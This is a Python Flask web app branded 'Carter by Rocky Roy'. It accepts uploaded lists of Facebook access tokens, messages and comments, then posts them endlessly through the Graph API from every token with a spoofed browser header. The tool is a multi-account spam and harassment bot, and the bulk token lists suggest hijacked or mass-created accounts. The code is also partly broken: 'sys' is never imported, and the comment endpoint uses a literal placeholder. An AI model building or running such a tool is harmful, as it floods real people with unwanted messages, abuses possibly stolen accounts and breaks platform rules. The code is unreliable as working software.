from flask import Flask, request, render_template_string
import os
import threading
import time
import random
import requests

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "tokens.txt")
MESSAGE_FILE = os.path.join(DATA_DIR, "messages.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comments.txt")
TIME_MSG_FILE = os.path.join(DATA_DIR, "time_msg.txt")
TIME_CMT_FILE = os.path.join(DATA_DIR, "time_cmt.txt")

# Function to save uploaded files
def save_file(file, path):
    with open(path, "wb") as f:
        f.write(file.read())

# Function to send messages using multiple tokens
def send_messages():
    try:
        with open(TOKEN_FILE, "r") as f:
            tokens = [line.strip() for line in f.readlines() if line.strip()]

        with open(MESSAGE_FILE, "r") as f:
            messages = [line.strip() for line in f.readlines() if line.strip()]

        with open(TIME_MSG_FILE, "r") as f:
            delay_msg = int(f.read().strip())

        if not (tokens and messages):
            print("[!] Tokens or Messages file is empty.")
            return

        while True:
            for token in tokens:
                for message in messages:
                    url = f"https://graph.facebook.com/v15.0/me/messages"
                    headers = {'User-Agent': 'Mozilla/5.0'}
                    payload = {'access_token': token, 'message': message}

                    response = requests.post(url, json=payload, headers=headers)
                    if response.ok:
                        print(f"[+] Message sent: {message}")
                    else:
                        print(f"[x] Failed: {response.status_code} {response.text}")

                    time.sleep(delay_msg)

    except Exception as e:
        print(f"[!] Error: {e}")

# Function to post comments using multiple tokens
def post_comments():
    try:
        with open(TOKEN_FILE, "r") as f:
            tokens = [line.strip() for line in f.readlines() if line.strip()]

        with open(COMMENT_FILE, "r") as f:
            comments = [line.strip() for line in f.readlines() if line.strip()]

        with open(TIME_CMT_FILE, "r") as f:
            delay_cmt = int(f.read().strip())

        if not (tokens and comments):
            print("[!] Tokens or Comments file is empty.")
            return

        while True:
            for token in tokens:
                for comment in comments:
                    url = f"https://graph.facebook.com/v15.0/post_id/comments"
                    headers = {'User-Agent': 'Mozilla/5.0'}
                    payload = {'access_token': token, 'message': comment}

                    response = requests.post(url, json=payload, headers=headers)
                    if response.ok:
                        print(f"[+] Comment posted: {comment}")
                    else:
                        print(f"[x] Failed: {response.status_code} {response.text}")

                    time.sleep(delay_cmt)

    except Exception as e:
        print(f"[!] Error: {e}")

# Auto Restart
def auto_restart():
    while True:
        time.sleep(3600)  # हर घंटे बाद ऑटो रिस्टार्ट
        os.execv(__file__, ["python"] + sys.argv)

threading.Thread(target=auto_restart, daemon=True).start()

# HTML Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carter by Rocky Roy</title>
    <style>
        body { background-color: black; color: white; font-family: Arial, sans-serif; text-align: center; }
        .container { background: #222; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }
        h1 { color: #ffcc00; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin: 10px 0 5px; }
        input, button { padding: 10px; border-radius: 5px; margin-bottom: 10px; }
        button { background-color: #ffcc00; color: black; border: none; cursor: pointer; }
        button:hover { background-color: #ff9900; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Carter by Rocky Roy</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label>Upload Tokens File:</label>
            <input type="file" name="token_file" required>

            <label>Upload Messages File:</label>
            <input type="file" name="message_file" required>

            <label>Upload Comments File:</label>
            <input type="file" name="comment_file" required>

            <label>Message Speed (Seconds):</label>
            <input type="number" name="delay_msg" value="5" min="1">

            <label>Comment Speed (Seconds):</label>
            <input type="number" name="delay_cmt" value="5" min="1">

            <button type="submit">Start Automation</button>
        </form>
        <footer>© 2025 Carter by Rocky Roy. All Rights Reserved.</footer>
    </div>
</body>
</html>
"""

# Flask route to render HTML form
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token_file = request.files.get("token_file")
        message_file = request.files.get("message_file")
        comment_file = request.files.get("comment_file")
        delay_msg = request.form.get("delay_msg", 5)
        delay_cmt = request.form.get("delay_cmt", 5)

        if token_file and message_file and comment_file:
            save_file(token_file, TOKEN_FILE)
            save_file(message_file, MESSAGE_FILE)
            save_file(comment_file, COMMENT_FILE)

            with open(TIME_MSG_FILE, "w") as f:
                f.write(str(delay_msg))

            with open(TIME_CMT_FILE, "w") as f:
                f.write(str(delay_cmt))

            threading.Thread(target=send_messages, daemon=True).start()
            threading.Thread(target=post_comments, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

# Start Flask server
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
